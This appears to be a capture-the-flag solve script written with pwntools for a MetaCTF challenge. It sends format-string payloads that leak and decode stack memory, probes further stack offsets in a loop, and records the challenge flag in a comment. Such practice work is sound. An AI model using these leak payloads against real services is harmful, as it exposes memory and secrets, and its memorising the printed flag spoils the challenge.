from pwn import *

if True:
    host = '127.0.0.1'
    port = 3005
else:
    host = 'host1.metaproblems.com'
    port = 5470

'''
s = remote(host, port)
s.recvuntil(b"What is your guess?\n")

# MetaCTF{L34kIn9_7h3_574CK_I5_oNLY_7H3_839innin9_wh47_3L53_C4n_yOU_do}
payload = b''
payload += b'%8$llx'
payload += b'%9$llx'
payload += b'%10$llx'
payload += b'%11$llx'
payload += b'%12$llx'
payload += b'%13$llx'
payload += b'%14$llx'
payload += b'%15$llx'
payload += b'%16$llx'
payload += b'%17$llx'
s.sendline(payload)

s.recvuntil(b"Your guessed wrong with ")
data = s.recvall()
print(data)
data = data.split(b'\n')[0]
print(data)
print()
outs = b''
while data:
    next = data[:2]
    data = data[2:]
    outs += bytes([int(next,16)])
data = outs
outs = b''
while data:
    next = data[:8]
    data = data[8:]
    outs += next[::-1]
print(outs)


s.close()
time.sleep(1)
'''
s = remote(host, port)
time.sleep(1)
d = s.recvuntil(b'?\n')
print(d)
lasti = 0
i = 40
limit = 100
while limit > 0:
    lasti = i
    payload = b''
    while True:
        tmp = f'%{i}$llx.'.encode('ascii')
        if len(payload) + len(tmp) > 100:
            break
        payload += tmp
        i += 1
    s.send(payload)
    d = s.recvuntil(b'\n')
    print(i, d)
    s.close()
    time.sleep(2)
    if b'core dump' in d:
        i = lasti
        limit //= 2
    s = remote(host, port)
    d = s.recvuntil(b'?\n')
